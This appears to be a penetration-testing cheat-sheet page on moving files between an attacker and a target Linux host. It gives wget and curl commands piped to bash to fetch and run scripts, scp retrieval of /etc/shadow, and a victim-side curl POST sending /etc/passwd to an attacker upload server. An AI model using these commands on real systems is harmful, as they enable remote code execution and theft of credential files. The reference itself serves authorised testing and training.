---
layout:
  title:
    visible: true
  description:
    visible: false
  tableOfContents:
    visible: true
  outline:
    visible: true
  pagination:
    visible: false
---

# Linux

## From ATTACKER to TARGET

### Linux base64 download

```bash
# Read as base64
cat test.txt | base64 -w 0 ; echo

# Decode base64
echo -n 'aGVsbG8sd29ybGQK' | base64 -d
```

### Linux download

```bash
# Download into disk
wget http://$IP/test.txt -O /tmp/test.txt

# Download into disk
curl -o /tmp/test.txt http://$IP/test.txt

# Download into memory
wget -qO- http://$IP/test.sh | bash

# Download into memory
curl http://$IP/test.sh | bash
```

### SSH download

```bash
# Download file from target
scp root@$IP:/etc/shadow .
```

## From TARGET to ATTACKER

### Linux web upload

```bash
# ATTACKER
# Create self-signed certificate
openssl req -x509 -out server.pem -keyout server.pem -newkey rsa:2048 -nodes -sha256 -subj '/CN=server'

# Start the UPLOAD server
mkdir https && cd https
python3 -m uploadserver 443 --server-certificate ../server.pem

# VICTIM
# Upload the file
curl -X POST https://$IP/upload -F 'files=@/etc/passwd' --insecure
```

### SSH upload

```bash
# Upload file to target
scp test.txt root@$IP:/tmp/
```

### Web server type

```bash
# Python server
python3 -m http.server
python2 -m SimpleHTTPServer

# PHP server
php -S 0.0.0.0:8000

# Ruby server
ruby -run -ehttpd . -p8000
```
